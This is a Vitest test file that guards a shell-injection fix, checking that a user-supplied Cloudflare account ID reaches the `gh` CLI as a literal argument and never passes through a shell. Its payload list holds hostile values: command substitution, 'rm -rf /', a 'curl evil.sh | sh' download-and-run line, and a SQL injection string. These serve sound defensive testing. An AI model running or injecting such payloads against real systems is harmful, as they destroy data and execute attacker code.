import { describe, it, expect, vi, beforeEach } from "vitest";

// Hermetic + offline: node:child_process is fully mocked, so nothing ever
// shells out to the real `gh`. These tests are the regression guard for the P1
// shell-injection fix in setupGitHubCiCredentials — a user-supplied Cloudflare
// account ID must reach `gh` as a literal argv element and NEVER be interpreted
// by a shell.
vi.mock("node:child_process", () => ({
  execSync: vi.fn(),
  spawnSync: vi.fn(() => ({
    status: 0,
    stdout: "",
    stderr: "",
    error: undefined,
  })),
}));

import { execSync, spawnSync } from "node:child_process";
import {
  buildAccountIdVariableArgs,
  executeArgv,
} from "../first-time-setup";

// A grab-bag of classic shell-injection payloads. If any of these were ever
// concatenated into a shell command string, they would execute arbitrary
// commands. The fix passes them as discrete argv elements, so they must always
// come back out byte-for-byte identical.
const INJECTION_PAYLOADS = [
  'foo"$(touch /tmp/pwned)"',
  "foo`touch /tmp/pwned`",
  "foo; rm -rf /",
  "foo && curl evil.sh | sh",
  "$(whoami)",
  "'; DROP TABLE variables; --",
];

beforeEach(() => {
  vi.clearAllMocks();
});

describe("buildAccountIdVariableArgs", () => {
  it("carries the account ID as a single, unmodified argv element", () => {
    const args = buildAccountIdVariableArgs("abc123");
    expect(args).toEqual([
      "variable",
      "set",
      "CLOUDFLARE_ACCOUNT_ID",
      "--body",
      "abc123",
    ]);
  });

  it.each(INJECTION_PAYLOADS)(
    "passes malicious value %j through literally (no shell metacharacter stripping/interpolation)",
    (payload) => {
      const args = buildAccountIdVariableArgs(payload);
      // The payload is exactly one argv element at index 4, unchanged.
      expect(args[4]).toBe(payload);
      // It must not be split, escaped, or merged into other elements.
      expect(args).toHaveLength(5);
      expect(args.filter((a) => a === payload)).toHaveLength(1);
    }
  );
});

describe("executeArgv (shell-injection safety)", () => {
  it.each(INJECTION_PAYLOADS)(
    "spawns gh with the payload %j as a discrete argv element and never through a shell",
    (payload) => {
      executeArgv("gh", buildAccountIdVariableArgs(payload), true);

      expect(spawnSync).toHaveBeenCalledTimes(1);
      const [file, argv, options] = (spawnSync as unknown as ReturnType<
        typeof vi.fn
      >).mock.calls[0];

      // Correct executable, argv array (not a shell string).
      expect(file).toBe("gh");
      expect(Array.isArray(argv)).toBe(true);
      // The account ID reaches gh verbatim as its own argument.
      expect(argv[4]).toBe(payload);
      // spawnSync must run WITHOUT a shell — this is what makes the payload inert.
      expect(options?.shell).toBeFalsy();
      // The vulnerable shell path (execSync with an interpolated string) is unused.
      expect(execSync).not.toHaveBeenCalled();
      // Sanity: the payload never appears interpolated into any single string arg
      // that a shell could re-parse (i.e. no `... --body "<payload>"` blob).
      expect(argv).not.toContain(`--body "${payload}"`);
    }
  );

  it("returns stdout on success (status 0) so the success branch still fires", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: 0,
      stdout: "ok",
      stderr: "",
      error: undefined,
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toBe("ok");
  });

  it("returns an error object on non-zero exit so the failure branch still fires", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: 1,
      stdout: "",
      stderr: "gh: not authenticated",
      error: undefined,
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toEqual({ error: true, message: "gh: not authenticated" });
  });

  it("returns an error object when spawnSync itself errors (e.g. gh not installed)", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: null,
      stdout: "",
      stderr: "",
      error: new Error("spawn gh ENOENT"),
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toEqual({ error: true, message: "spawn gh ENOENT" });
  });
});
